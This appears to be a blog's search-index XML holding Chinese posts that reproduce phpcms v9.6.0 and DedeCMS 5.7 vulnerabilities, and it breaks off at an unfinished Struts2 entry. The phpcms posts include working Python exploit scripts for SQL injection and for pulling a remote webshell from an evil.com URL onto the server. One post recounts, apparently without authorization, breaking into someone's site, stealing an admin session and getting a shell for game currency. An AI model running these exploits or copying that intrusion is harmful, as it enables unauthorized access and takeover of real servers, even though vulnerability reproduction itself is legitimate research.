<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>phpcmsv9.6.0SQL注入</title>
      <link href="/2020/02/13/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/02/13/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="phpcmsv9-6-0SQL注入"><a href="#phpcmsv9-6-0SQL注入" class="headerlink" title="phpcmsv9.6.0SQL注入"></a>phpcmsv9.6.0SQL注入</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol><li>开启wap</li><li>phpcms 版本小于等于9.6.0</li></ol><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞信息:</p><blockquote><p>这个版本的 <strong>SQL注入</strong> 主要在于程序对解密后的数据没有进行过滤. 漏洞文件: <strong>phpcms/modules/content/down.php</strong> 。在其 <strong>init</strong> 方法中，从 <strong>GET</strong> 数据中获取了 <strong>a_k</strong> 的值 ,解密后直接变量覆盖,导致命令执行</p></blockquote><pre><code class="php">public function init() {        $a_k = trim($_GET[&#39;a_k&#39;]);        $a_k = sys_auth($a_k, &#39;DECODE&#39;, pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;));        if(empty($a_k)) showmessage(L(&#39;illegal_parameters&#39;));        parse_str($a_k);        if(isset($i)) $i = $id = intval($i);        if(!isset($m)) showmessage(L(&#39;illegal_parameters&#39;));        if(!isset($modelid)||!isset($catid)) showmessage(L(&#39;illegal_parameters&#39;));        if(empty($f)) showmessage(L(&#39;url_invalid&#39;));        $allow_visitor = 1;        $MODEL = getcache(&#39;model&#39;,&#39;commons&#39;);        $tablename = $this-&gt;db-&gt;table_name = $this-&gt;db-&gt;db_tablepre.$MODEL[$modelid][&#39;tablename&#39;];        $this-&gt;db-&gt;table_name = $tablename.&#39;_data&#39;;        $rs = $this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));            ...    }</code></pre><p><code>$this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));</code>跟进去</p><pre><code class="php">final public function get_one($where = &#39;&#39;, $data = &#39;*&#39;, $order = &#39;&#39;, $group = &#39;&#39;) {        if (is_array($where)) $where = $this-&gt;sqls($where);        return $this-&gt;db-&gt;get_one($data, $this-&gt;table_name, $where, $order, $group);    }</code></pre><pre><code class="php">final public function sqls($where, $font = &#39; AND &#39;) {        if (is_array($where)) {            $sql = &#39;&#39;;            foreach ($where as $key=&gt;$val) {                $sql .= $sql ? &quot; $font `$key` = &#39;$val&#39; &quot; : &quot; `$key` = &#39;$val&#39;&quot;;            }            return $sql;        } else {            return $where;        }    }</code></pre><pre><code class="php">public function get_one($data, $table, $where = &#39;&#39;, $order = &#39;&#39;, $group = &#39;&#39;) {        $where = $where == &#39;&#39; ? &#39;&#39; : &#39; WHERE &#39;.$where;        $order = $order == &#39;&#39; ? &#39;&#39; : &#39; ORDER BY &#39;.$order;        $group = $group == &#39;&#39; ? &#39;&#39; : &#39; GROUP BY &#39;.$group;        $limit = &#39; LIMIT 1&#39;;        $field = explode( &#39;,&#39;, $data);        array_walk($field, array($this, &#39;add_special_char&#39;));        $data = implode(&#39;,&#39;, $field);        $sql = &#39;SELECT &#39;.$data.&#39; FROM `&#39;.$this-&gt;config[&#39;database&#39;].&#39;`.`&#39;.$table.&#39;`&#39;.$where.$group.$order.$limit;        $this-&gt;execute($sql);        $res = $this-&gt;fetch_next();        $this-&gt;free_result();        return $res;    }</code></pre><p>没有对解密后的id进行任何过滤</p><p>接着要找一个能用相同密钥加密的地方,这样便无需暴露auth_key就能执行恶意sql语句</p><p>我们利用<code>set_cookie</code>来生成加密数据</p><p><code>setcookie($var, sys_auth($value, &#39;ENCODE&#39;), $time, pc_base::load_config(&#39;system&#39;,&#39;cookie_path&#39;), pc_base::load_config(&#39;system&#39;,&#39;cookie_domain&#39;), $s);</code></p><p>查找调用<code>set_cookie</code>且值<code>$value</code>可控的位置</p><p><code>phpcms/modules/attachment/attachments.php</code> 文件的 <code>swfupload_json</code> 方法有满足我们需要的代码。(菜鸡直接看别人找到的)</p><pre><code class="php">public function swfupload_json() {        $arr[&#39;aid&#39;] = intval($_GET[&#39;aid&#39;]);        $arr[&#39;src&#39;] = safe_replace(trim($_GET[&#39;src&#39;]));        $arr[&#39;filename&#39;] = urlencode(safe_replace($_GET[&#39;filename&#39;]));        $json_str = json_encode($arr);        $att_arr_exist = param::get_cookie(&#39;att_json&#39;);        $att_arr_exist_tmp = explode(&#39;||&#39;, $att_arr_exist);        if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) {            return true;        } else {            $json_str = $att_arr_exist ? $att_arr_exist.&#39;||&#39;.$json_str : $json_str;            param::set_cookie(&#39;att_json&#39;,$json_str);            return true;                    }    }</code></pre><p><code>$arr[&#39;src&#39;] = safe_replace(trim($_GET[&#39;src&#39;]));</code>,跟进<code>safe_replace</code></p><pre><code class="php">function safe_replace($string) {    $string = str_replace(&#39;%20&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;%27&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;%2527&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;*&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;&quot;&#39;,&#39;&amp;quot;&#39;,$string);    $string = str_replace(&quot;&#39;&quot;,&#39;&#39;,$string);    $string = str_replace(&#39;&quot;&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;;&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;&lt;&#39;,&#39;&amp;lt;&#39;,$string);    $string = str_replace(&#39;&gt;&#39;,&#39;&amp;gt;&#39;,$string);    $string = str_replace(&quot;{&quot;,&#39;&#39;,$string);    $string = str_replace(&#39;}&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;\\&#39;,&#39;&#39;,$string);    return $string;}</code></pre><p>虽然这里单引号被过滤了,但是前面是用<code>parse_str($a_k);</code>来恢复变量的,我们可以利用<code>safe_replace</code>能将某些字符替换为空格用url编码来绕过黑名单</p><p>但是在调用<code>swfupload_json</code> 前,它还会调用<code>__construct</code>方法</p><pre><code class="php">function __construct() {        pc_base::load_app_func(&#39;global&#39;);        $this-&gt;upload_url = pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;);        $this-&gt;upload_path = pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;);                $this-&gt;imgext = array(&#39;jpg&#39;,&#39;gif&#39;,&#39;png&#39;,&#39;bmp&#39;,&#39;jpeg&#39;);        $this-&gt;userid = $_SESSION[&#39;userid&#39;] ? $_SESSION[&#39;userid&#39;] : (param::get_cookie(&#39;_userid&#39;) ? param::get_cookie(&#39;_userid&#39;) : sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;));        $this-&gt;isadmin = $this-&gt;admin_username = $_SESSION[&#39;roleid&#39;] ? 1 : 0;        $this-&gt;groupid = param::get_cookie(&#39;_groupid&#39;) ? param::get_cookie(&#39;_groupid&#39;) : 8;        //判断是否登录        if(empty($this-&gt;userid)){            showmessage(L(&#39;please_login&#39;,&#39;&#39;,&#39;member&#39;));        }    }</code></pre><p>我们需要用<code>sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;)</code>来生成<code>$this-&gt;userid</code>,来绕过死亡exit</p><p>这次我们还需要找一个地方来生成<code>userid</code>,但是限制更少了,只要<code>$this-&gt;userid</code>不为空即可</p><p> 我们可以搜到 <code>phpcms/modules/wap/index.php</code> 文件，在该文件中 <code>$_GET[&#39;siteid&#39;]</code> 可控，并且可以通过 <strong>cookie</strong> 获得加密后的数据,虽然有intval来过滤</p><pre><code class="php">function __construct() {                $this-&gt;db = pc_base::load_model(&#39;content_model&#39;);        $this-&gt;siteid = isset($_GET[&#39;siteid&#39;]) &amp;&amp; (intval($_GET[&#39;siteid&#39;]) &gt; 0) ? intval(trim($_GET[&#39;siteid&#39;])) : (param::get_cookie(&#39;siteid&#39;) ? param::get_cookie(&#39;siteid&#39;) : 1);        param::set_cookie(&#39;siteid&#39;,$this-&gt;siteid);            $this-&gt;wap_site = getcache(&#39;wap_site&#39;,&#39;wap&#39;);        $this-&gt;types = getcache(&#39;wap_type&#39;,&#39;wap&#39;);        $this-&gt;wap = $this-&gt;wap_site[$this-&gt;siteid];        define(&#39;WAP_SITEURL&#39;, $this-&gt;wap[&#39;domain&#39;] ? $this-&gt;wap[&#39;domain&#39;].&#39;index.php?&#39; : APP_PATH.&#39;index.php?m=wap&amp;siteid=&#39;.$this-&gt;siteid);        if($this-&gt;wap[&#39;status&#39;]!=1) exit(L(&#39;wap_close_status&#39;));    }</code></pre><p>于是整个攻击链便完整了</p><p>先利用wap来获得<code>userid</code></p><p><code>http://127.0.0.1/cms/phpcms/9.6.0/index.php?m=wap&amp;siteid=1</code></p><p><code>2a8a6kid_pv1EoSGXugr-5BZDZWzDhaB7W3EtXou</code></p><p>再利用attachment来获得加密的恶意sql语句</p><pre><code>http://127.0.0.1/cms/phpcms/9.6.0/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;src=(看poc吧)post:userid_flash=2a8a6kid_pv1EoSGXugr-5BZDZWzDhaB7W3EtXou</code></pre><h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><pre><code class="python">import reimport requestsimport randomdef poc(url,proxies={}):    sess=requests.session()    sess.get(&quot;%s/index.php?m=wap&amp;siteid=1&quot;%url)    sess.proxies=proxies    pre=list(sess.cookies.get_dict())[0][:5]+&quot;_&quot;    userid=sess.cookies.get_dict()[pre+&quot;siteid&quot;]    param={        &quot;m&quot;:&quot;attachment&quot;,        &quot;c&quot;:&quot;attachments&quot;,        &quot;a&quot;:&quot;swfupload_json&quot;,        &quot;src&quot;:&quot;=1&amp;id=nobodyasdfsdsf%2;7-(updatexml(1,concat(0x7e,(select%2;0user()),0x7e),1))%23&amp;m=1&amp;modelid=1&amp;catid=1&amp;f=1&amp;ss&quot;    }    sess.post(&quot;%s/index.php&quot;%url,params=param,data={&quot;userid_flash&quot;:userid})    a_k=sess.cookies.get_dict()[pre+&quot;att_json&quot;]    result=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=%s&quot;%(url,a_k)).text    #print(userid,a_k)    if &quot;XPATH syntax error&quot; in result:        return True    return False#,{&quot;http&quot;:&quot;socks5://127.0.0.1:1080&quot;}print(poc(&quot;http://127.0.0.1/cms/phpcms/9.6.0/&quot;))</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集</a></p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2020/02/13/phpcmsv9.6.0SQL注入/">https://explorersss.github.io/2020/02/13/phpcmsv9.6.0SQL注入/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpcms960任意文件上传复现</title>
      <link href="/2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="phpcmsv9-6-0任意文件上传"><a href="#phpcmsv9-6-0任意文件上传" class="headerlink" title="phpcmsv9.6.0任意文件上传"></a>phpcmsv9.6.0任意文件上传</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>phpcms v9.6.0</p><p>开启用户注册功能</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>根据网络上提供的poc进行漏洞复现:</p><pre><code class="python">import reimport requestsdef poc(url):    u = &#39;{}/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&#39;.format(url)    data = {        &#39;siteid&#39;: &#39;1&#39;,        &#39;modelid&#39;: &#39;1&#39;,        &#39;username&#39;: &#39;test&#39;,        &#39;password&#39;: &#39;testxx&#39;,        &#39;email&#39;: &#39;test@test.com&#39;,        &#39;info[content]&#39;: &#39;&lt;img src=http://url/shell.txt?.php#.jpg&gt;&#39;,        &#39;dosubmit&#39;: &#39;1&#39;,    }    rep = requests.post(u, data=data)    shell = &#39;&#39;    re_result = re.findall(r&#39;&amp;lt;img src=(.*)&amp;gt&#39;, rep.content)    if len(re_result):        shell = re_result[0]        print shell</code></pre><p>漏洞的关键位置</p><p><code>phpcms/modules/member/index.php</code>:135</p><pre><code class="php">if($member_setting[&#39;choosemodel&#39;]) {    require_once CACHE_MODEL_PATH.&#39;member_input.class.php&#39;;    require_once CACHE_MODEL_PATH.&#39;member_update.class.php&#39;;    $member_input = new member_input($userinfo[&#39;modelid&#39;]);            $_POST[&#39;info&#39;] = array_map(&#39;new_html_special_chars&#39;,$_POST[&#39;info&#39;]);    $user_model_info = $member_input-&gt;get($_POST[&#39;info&#39;]);                                        }</code></pre><p><code>$_POST[&#39;info&#39;]</code>被<code>new_html_special_chars</code>处理后,直接作为参数传入<code>$member_input-&gt;get</code></p><p>跟进去发现</p><pre><code class="php">if(is_array($data)) {            foreach($data as $field=&gt;$value) {                ...                $field = safe_replace($field);                ...                $func = $this-&gt;fields[$field][&#39;formtype&#39;];                if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value);                $info[$field] = $value;            }        }</code></pre><p><code>$this-&gt;$func($field, $value);</code>令人浮想联翩的命令,而<code>$func = $this-&gt;fields[$field][&#39;formtype&#39;];</code>,其中<code>$field</code>是我们可控的输入<code>new_html_special_chars($_POST[&#39;info&#39;]) as $field=&gt;$value</code></p><p>而<code>$this-&gt;fields[$field][&#39;formtype&#39;];</code>有以下取值,我们可以控制其执行某一函数</p><pre><code class="php">$this-&gt;fields[&#39;catid&#39;][&#39;formtype&#39;]=&quot;catid&quot;$this-&gt;fields[&#39;typeid&#39;][&#39;formtype&#39;]=&quot;typeid&quot;$this-&gt;fields[&#39;title&#39;][&#39;formtype&#39;]=&quot;title&quot;$this-&gt;fields[&#39;keywords&#39;][&#39;formtype&#39;]=&quot;keyword&quot;$this-&gt;fields[&#39;copyfrom&#39;][&#39;formtype&#39;]=&quot;copyfrom&quot;$this-&gt;fields[&#39;description&#39;][&#39;formtype&#39;]=&quot;textarea&quot;$this-&gt;fields[&#39;updatetime&#39;][&#39;formtype&#39;]=&quot;datetime&quot;$this-&gt;fields[&#39;content&#39;][&#39;formtype&#39;]=&quot;editor&quot;$this-&gt;fields[&#39;thumb&#39;][&#39;formtype&#39;]=&quot;image&quot;$this-&gt;fields[&#39;relation&#39;][&#39;formtype&#39;]=&quot;omnipotent&quot;$this-&gt;fields[&#39;pages&#39;][&#39;formtype&#39;]=&quot;pages&quot;$this-&gt;fields[&#39;inputtime&#39;][&#39;formtype&#39;]=&quot;datetime&quot;$this-&gt;fields[&#39;posids&#39;][&#39;formtype&#39;]=&quot;posid&quot;$this-&gt;fields[&#39;groupids_view&#39;][&#39;formtype&#39;]=&quot;groupid&quot;$this-&gt;fields[&#39;voteid&#39;][&#39;formtype&#39;]=&quot;omnipotent&quot;$this-&gt;fields[&#39;islink&#39;][&#39;formtype&#39;]=&quot;islink&quot;$this-&gt;fields[&#39;url&#39;][&#39;formtype&#39;]=&quot;text&quot;$this-&gt;fields[&#39;listorder&#39;][&#39;formtype&#39;]=&quot;number&quot;$this-&gt;fields[&#39;template&#39;][&#39;formtype&#39;]=&quot;template&quot;$this-&gt;fields[&#39;allow_comment&#39;][&#39;formtype&#39;]=&quot;box&quot;$this-&gt;fields[&#39;status&#39;][&#39;formtype&#39;]=&quot;box&quot;$this-&gt;fields[&#39;readpoint&#39;][&#39;formtype&#39;]=&quot;readpoint&quot;$this-&gt;fields[&#39;username&#39;][&#39;formtype&#39;]=&quot;text&quot;</code></pre><p>一个一个查看最后发现:</p><pre><code class="php">    function editor($field, $value) {        $setting = string2array($this-&gt;fields[$field][&#39;setting&#39;]);        $enablesaveimage = $setting[&#39;enablesaveimage&#39;];        $site_setting = string2array($this-&gt;site_config[&#39;setting&#39;]);        $watermark_enable = intval($site_setting[&#39;watermark_enable&#39;]);        $value = $this-&gt;attachment-&gt;download(&#39;content&#39;, $value,$watermark_enable);        return $value;    }</code></pre><p><code>editor</code>会调用download方法,其中<code>$field</code>和<code>$value</code>都是可控的</p><p>跟进<code>download</code>:</p><pre><code class="php">function download($field, $value,$watermark = &#39;0&#39;,$ext = &#39;gif|jpg|jpeg|bmp|png&#39;, $absurl = &#39;&#39;, $basehref = &#39;&#39;)    {        global $image_d;        $this-&gt;att_db = pc_base::load_model(&#39;attachment_model&#39;);        $upload_url = pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;);        $this-&gt;field = $field;        $dir = date(&#39;Y/md/&#39;);        $uploadpath = $upload_url.$dir;        $uploaddir = $this-&gt;upload_root.$dir;        $string = new_stripslashes($value);        if(!preg_match_all(&quot;/(href|src)=([\&quot;|&#39;]?)([^ \&quot;&#39;&gt;]+\.($ext))\\2/i&quot;, $string, $matches)) return $value;        $remotefileurls = array();        foreach($matches[3] as $matche)        {            if(strpos($matche, &#39;://&#39;) === false) continue;            dir_create($uploaddir);            $remotefileurls[$matche] = $this-&gt;fillurl($matche, $absurl, $basehref);        }        unset($matches, $string);        $remotefileurls = array_unique($remotefileurls);        $oldpath = $newpath = array();        foreach($remotefileurls as $k=&gt;$file) {            if(strpos($file, &#39;://&#39;) === false || strpos($file, $upload_url) !== false) continue;            $filename = fileext($file);            $file_name = basename($file);            $filename = $this-&gt;getname($filename);            $newfile = $uploaddir.$filename;            $upload_func = $this-&gt;upload_func;            if($upload_func($file, $newfile)) {                $oldpath[] = $k;                $GLOBALS[&#39;downloadfiles&#39;][] = $newpath[] = $uploadpath.$filename;                @chmod($newfile, 0777);                $fileext = fileext($filename);                if($watermark){                    watermark($newfile, $newfile,$this-&gt;siteid);                }                $filepath = $dir.$filename;                $downloadedfile = array(&#39;filename&#39;=&gt;$filename, &#39;filepath&#39;=&gt;$filepath, &#39;filesize&#39;=&gt;filesize($newfile), &#39;fileext&#39;=&gt;$fileext);                $aid = $this-&gt;add($downloadedfile);                $this-&gt;downloadedfiles[$aid] = $filepath;            }        }        return str_replace($oldpath, $newpath, $value);    }    </code></pre><p><code>download</code>用<code>$upload_func($file, $newfile)</code>来下载文件到服务器,而<code>$upload_func=&quot;copy&quot;</code></p><p>我们分析一下<code>download</code>函数,<code>$file</code>和<code>$newfile</code>经过的处理</p><p><code>$file</code>是<code>$remotefileurls</code>中的值</p><pre><code class="php">        $string = new_stripslashes($value);//反转义        if(!preg_match_all(&quot;/(href|src)=([\&quot;|&#39;]?)([^ \&quot;&#39;&gt;]+\.($ext))\\2/i&quot;, $string, $matches)) return $value;        $remotefileurls = array();        foreach($matches[3] as $matche)        {            if(strpos($matche, &#39;://&#39;) === false) continue;            dir_create($uploaddir);            $remotefileurls[$matche] = $this-&gt;fillurl($matche, &#39;&#39;, &#39;&#39;);        }</code></pre><p>跟进<code>$this-&gt;fillurl</code>,大概功能是,去掉url<code>#</code>后面的东西</p><pre><code class="php">function fillurl($surl, $absurl, $basehref = &#39;&#39;) {        ...        $pos = strpos($surl,&#39;#&#39;);        if($pos&gt;0) $surl = substr($surl,0,$pos);        ...    }</code></pre><p>构造<code>$value=&#39;src=http://evil.com/evil.php#.jpg&#39;</code></p><p>我们再看下<code>$newfile</code></p><pre><code class="php">$dir = date(&#39;Y/md/&#39;);$uploaddir = $this-&gt;upload_root.$dir;$filename = fileext($file);$filename = $this-&gt;getname($filename);$newfile = $uploaddir.$filename;</code></pre><p><code>$this-&gt;getname</code>:</p><pre><code class="php">function getname($fileext){        return date(&#39;Ymdhis&#39;).rand(100, 999).&#39;.&#39;.$fileext;    }</code></pre><p>webshell的地址为:<code>http://website/uploadfile/date(&#39;Y/md/&#39;)/date(&#39;Ymdhis&#39;).rand(100, 999).php</code></p><p>最后payload为:</p><pre><code>/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1post:info[content]=&lt;img src=&quot;http://evil.com/evil.php&quot;&gt;</code></pre><h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><pre><code class="python">import reimport requestsimport randomdef exp(url,evilurl=&quot;http://xxxxxxx/evil.php&quot;):    u = &#39;{}/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&#39;.format(url)    data = {        &#39;siteid&#39;: &#39;1&#39;,        &#39;modelid&#39;: &#39;1&#39;,        &#39;username&#39;: &#39;test%d&#39;%random.randint(1,999999),        &#39;password&#39;: &#39;testxx&#39;,        &#39;email&#39;: &#39;test%d@test.com&#39;%random.randint(1,999999),        &#39;info[content]&#39;: &#39;src=%s#.jpg&#39;%evilurl,        &#39;dosubmit&#39;: &#39;1&#39;,    }    rep = requests.post(u, data=data)    result=re.search(r&quot;VALUES \(&#39;src=(.*)&#39;,&#39;\d*&#39;\)&quot;,rep.text).groups()    print(rep.text)    print(result)exp(&quot;http://127.0.0.1/cms/phpcms/9.6.0&quot;)</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2020/02/12/phpcms960任意文件上传复现/">https://explorersss.github.io/2020/02/12/phpcms960任意文件上传复现/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次漏洞挖掘</title>
      <link href="/2020/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
      <url>/2020/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
      
        <content type="html"><![CDATA[<h1 id="无标题"><a href="#无标题" class="headerlink" title="无标题"></a>无标题</h1><p>某个月黑风高的晚上,我突然想起了我的复古游戏机还差一点库币,于是决定去挖个洞 …….</p><p>经过一番惨绝人寰,欲罢不能的信息收集后,我开始了fuzz,然后 ip被ban:(</p><p>主要的信息为:</p><pre><code>dedecms 5.7sp1 20150618ZOHO ManageEngine OpManageradminer 4.6.3</code></pre><p>爆破密码,fuzz文件啥的都干过,dedecms的后台也没爆出来,但是发现他们服务器配置错误,可以浏览目录</p><p>把该版本的dedecms之后的更新对比了以下,没发现有啥洞,此时就陷入了僵局</p><p>但是,我随手点了一个<code>en</code>的超链接,就发现了一个新的域名!!!!</p><p>然后这个域名下的服务,也是dedecms,而后台就是<code>/dede</code></p><p>利用前面发现的目录浏览,我成功拿到了<code>admin</code>的session,直接进入后台getshell</p><p><strong>一些网站的英文站点可能就是我们的突破口</strong></p><p>资产收集真的太重要了,要不是这次运气好,我还不知道啥时候能日掉</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2020/02/11/记一次漏洞挖掘/">https://explorersss.github.io/2020/02/11/记一次漏洞挖掘/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DedeCMS 5.7 plusguestbook.php注入漏洞</title>
      <link href="/2020/02/10/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/02/10/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="DedeCMS-5-7-plus-guestbook-php-注入漏洞"><a href="#DedeCMS-5-7-plus-guestbook-php-注入漏洞" class="headerlink" title="DedeCMS 5.7 plus/guestbook.php 注入漏洞"></a>DedeCMS 5.7 plus/guestbook.php 注入漏洞</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>漏洞成功需要条件：</p><ol><li>php magic_quotes_gpc=off</li><li>漏洞文件存在 plus/guestbook.php dede_guestbook 表当然也要存在。</li></ol><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>poc:<code>www.xxx.com/plus/guestbook.php?action=admin&amp;job=editok&amp;msg=sebug&#39;&amp;id=存在的留言ID</code></p><p><code>/plus/guestbook.php</code>中为对身份进行验证:</p><pre><code class="php">if($action==&#39;admin&#39;){    include_once(dirname(__FILE__).&#39;/guestbook/edit.inc.php&#39;);    exit();}</code></pre><p><code>/plus/guestbook/edit.inc.php</code></p><pre><code class="php">if($job==&#39;editok&#39;){    $remsg = trim($remsg);    if($remsg!=&#39;&#39;)    {        //管理员回复不过滤HTML        if($g_isadmin)        {            $msg = &quot;&lt;div class=\\&#39;rebox\\&#39;&gt;&quot;.$msg.&quot;&lt;/div&gt;\n&quot;.$remsg;             //$remsg &lt;br&gt;&lt;font color=red&gt;管理员回复：&lt;/font&gt;        }        else        {            $row = $dsql-&gt;GetOne(&quot;SELECT msg From `#@__guestbook` WHERE id=&#39;$id&#39; &quot;);            $oldmsg = &quot;&lt;div class=\\&#39;rebox\\&#39;&gt;&quot;.addslashes($row[&#39;msg&#39;]).&quot;&lt;/div&gt;\n&quot;;            $remsg = trimMsg(cn_substrR($remsg, 1024), 1);            $msg = $oldmsg.$remsg;        }    }     $msg = HtmlReplace($msg, -1);    $dsql-&gt;ExecuteNoneQuery(&quot;UPDATE `#@__guestbook` SET `msg`=&#39;$msg&#39;, `posttime`=&#39;&quot;.time().&quot;&#39; WHERE id=&#39;$id&#39; &quot;);    ShowMsg(&quot;成功更改或回复一条留言！&quot;, $GUEST_BOOK_POS);    exit();}</code></pre><p>其中:</p><pre><code class="php">$msg = HtmlReplace($msg, -1);    $dsql-&gt;ExecuteNoneQuery(&quot;UPDATE `#@__guestbook` SET `msg`=&#39;$msg&#39;, `posttime`=&#39;&quot;.time().&quot;&#39; WHERE id=&#39;$id&#39; &quot;);</code></pre><p>dedecms中的<code>common.inc.php</code>,有这样的一段代码</p><pre><code class="php">foreach(Array(&#39;_GET&#39;,&#39;_POST&#39;,&#39;_COOKIE&#39;) as $_request)    {        foreach($$_request as $_k =&gt; $_v)         {            if($_k == &#39;nvarname&#39;) ${$_k} = $_v;            else ${$_k} = _RunMagicQuotes($_v);        }    }</code></pre><p>它将<code>_GET</code>,<code>_POST</code>,<code>_COOKIE</code>中的变量放出来,而<code>_RunMagicQuotes</code></p><pre><code class="php">function _RunMagicQuotes(&amp;$svar){    if(!get_magic_quotes_gpc())    {        ...    }    return $svar;}</code></pre><p>所以<code>magic_quotes_gpc=off</code>的情况下便会引起sql注入</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://www.seebug.org/vuldb/ssvid-89599" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-89599</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://explorersss.github.io/2020/02/10/DedeCMS">https://explorersss.github.io/2020/02/10/DedeCMS</a> 5.7 plusguestbook.php注入漏洞/](<a href="https://explorersss.github.io/2020/02/10/DedeCMS">https://explorersss.github.io/2020/02/10/DedeCMS</a> 5.7 plusguestbook.php注入漏洞/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>S2-013_S2-014远程代码执行漏洞</title>
      <link href="/2020/02/08/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/02/08/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
